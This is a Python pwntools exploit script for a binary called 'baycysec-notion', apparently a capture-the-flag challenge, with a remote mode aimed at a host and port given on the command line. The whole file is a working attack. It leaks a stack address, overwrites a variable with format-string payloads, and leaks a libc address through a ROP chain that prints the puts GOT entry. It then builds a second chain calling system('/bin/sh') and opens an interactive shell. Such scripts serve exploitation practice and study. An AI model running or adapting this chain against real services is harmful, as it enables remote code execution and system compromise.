from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript="""
break * 0x00000000004016b3
continue
"""
exe = './baycysec-notion'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'INFO'

library = './libc.so.6'
libc = context.binary = ELF(library, checksec=False)

sh = start()
rop = ROP(elf)

sh.sendlineafter(b'>', b'5')
sh.send(cyclic(8))
sh.recvuntil(b'abaaa')
leak = unpack(sh.recv(6) + b'\x00' * 2)
log.success(f'LEAK -> {hex(leak)}')

var = leak - 40
log.info(f'var -> {hex(var)}')
sh.sendlineafter(b'>', b'2')

offset = 6
exp = fmtstr_payload(offset, {var+4: (0x1337c0de & 0xffff)})
exp2 = fmtstr_payload(offset, {var+6: (0x1337c0de >> 16)})

sh.sendline(exp)
sh.sendline(exp2)

g = 0x0000000000401398 # pop rbp; nop; nop; mov r14, rax; ret;
info(f'mov gdg -> {hex(g)}')

g2 = 0x00000000004013b1 # xchg r14, rdi; pop rbp; nop; pop r8; xor rax, rax; ret;
info(f'xchg gdg -> {hex(g2)}')

p = flat([
    cyclic(72),
    # rop.find_gadget(['ret'])[0],
    rop.find_gadget(['pop rax', 'ret']).address, elf.got['puts'],
    g, cyclic(8),
    g2, cyclic(8), 0x0,
    elf.plt['printf'],
    rop.find_gadget(['ret'])[0],
    0x40149d
])

sh.sendline(p)
sh.recvuntil(b'[#] ..3\n')
sh.recvuntil(b'\x1b[0m')
get = unpack(sh.recv(6) + b'\x00' * 2)
info(f'libc -> {hex(get)}')

libc.address = get - 0x805a0
success(f'libc base -> {hex(libc.address)}')
# gdb.attach(sh)

libcrop = ROP(libc)
libcrop.call(rop.find_gadget(['ret'])[0])
libcrop.call(libc.sym['system'], [next(libc.search(b'/bin/sh\x00'))])

rce = cyclic(72) + libcrop.chain()
log.progress(libcrop.dump())
sh.sendline(rce)
sh.interactive()